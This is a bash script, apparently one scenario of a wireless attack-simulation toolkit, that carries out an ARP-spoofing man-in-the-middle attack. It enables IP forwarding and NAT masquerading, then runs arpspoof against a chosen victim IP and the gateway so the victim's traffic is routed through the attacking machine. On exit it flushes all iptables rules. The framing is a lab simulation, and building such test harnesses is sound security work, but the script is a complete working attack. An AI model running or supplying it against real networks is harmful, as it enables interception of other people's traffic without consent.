#!/bin/bash

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
SCENARIO_DIR="$BASH_DIR/scenarios"
SERVICES_DIR="$BASH_DIR/services"
UTILITIES_DIR="$BASH_DIR/utilities"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/t014.conf"

# ─── Dependencies ───
source "$HELPERS_DIR/fn_mode.sh"
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_prompt.sh"

# --- Cleanup ---
SPOOF_CLIENT_PID=""
SPOOF_GATEWAY_PID=""
cleanup() {
    print_info "Cleaning up..."
    print_action "Stopping NAT and flushing iptables rules"
    # Terminate both arpspoof processes
    if [[ -n "$SPOOF_CLIENT_PID" ]]; then
        kill -9 "$SPOOF_CLIENT_PID" &>/dev/null
    fi
    if [[ -n "$SPOOF_GATEWAY_PID" ]]; then
        kill -9 "$SPOOF_GATEWAY_PID" &>/dev/null
    fi
    print_success "Terminated arpspoof processes."
    sysctl -w net.ipv4.ip_forward=0 > /dev/null
    iptables -F
    iptables -t nat -F
    print_success "NAT stopped and rules flushed."
}
trap cleanup EXIT SIGINT

# ─── Show Scenario ───
print_none "Threat:        $SCN_NAME"
print_none "Tool:          $SCN_TOOL"
print_none "Mode:          $SCN_MODE"
print_blank
print_wrapped_indent "Objective: " \
"This scenario simulates a man-in-the-middle (MiTM) attack via ARP spoofing. The WATT machine acts as a malicious client on a legitimate network. It uses 'arpspoof' to poison the ARP cache of a target client and the network gateway. This redirects the victim's traffic through the WATT machine, enabling interception."
print_line

confirmation

# ─── Show Requirements ───
print_section "Requirements"
print_warn "This is the most complex scenario to set up."
print_none "1. A legitimate Access Point must be running."
print_none "2. A separate 'Victim' client device must be connected to the AP."
print_none "3. The WATT machine must also be connected as a client to the same AP."
print_none "4. You will need to know the IP address of the 'Victim' client."
print_blank
print_action "Ensure the above setup is complete before proceeding."
confirmation

# --- Pre-flight Check ---
print_section "Pre-flight Checks"
print_action "Verifying WATT machine's network connection..."
IP_ADDR=$(ip -4 addr show "$INTERFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [[ -z "$IP_ADDR" ]]; then
    print_fail "WATT machine has no IP address on interface $INTERFACE."
    print_warn "Please ensure WATT is connected as a client to the target AP and has a valid IP."
    exit 1
else
    print_success "WATT has IP address: $IP_ADDR"
fi

print_action "Checking for arpspoof tool..."
if ! command -v arpspoof &> /dev/null; then
    print_fail "arpspoof is not installed. Please install dsniff (e.g., 'sudo apt-get install dsniff')."
    exit 1
else
    print_success "arpspoof found."
fi
print_blank

# ─── Show Capture Config ───
print_section "Capture Preparation"
print_none "Type:          $SCN_CAPTURE"
print_none "BSSID:         $SCN_BSSID"
print_none "Channel:       $SCN_CHANNEL"
print_none "Duration:      $SCN_DURATION seconds"
print_action "Launch Capture"

confirmation

# ─── Run Simulation ───
clear
print_section "Simulation"

ensure_managed_mode
print_blank
print_action "Starting NAT: Client Internet access ENABLED"
sysctl -w net.ipv4.ip_forward=1 > /dev/null
iptables -t nat -A POSTROUTING -o $SCN_FWD_INTERFACE -j MASQUERADE
print_blank
print_waiting "Running ARP spoofing attack..."

# Launch two arpspoof processes in the background
# 1. Poison the client, telling it we are the gateway
arpspoof -i "$INTERFACE" -t "$SCN_TARGET_IP" "$SCN_GATEWAY" &
SPOOF_CLIENT_PID=$!

# 2. Poison the gateway, telling it we are the client
arpspoof -i "$INTERFACE" -t "$SCN_GATEWAY" "$SCN_TARGET_IP" &
SPOOF_GATEWAY_PID=$!

print_info "Attack is running for $SCN_DURATION seconds..."
sleep "$SCN_DURATION"

print_blank
print_info "Simulation duration complete. Cleaning up..."
print_success "Simulation completed"

exit 0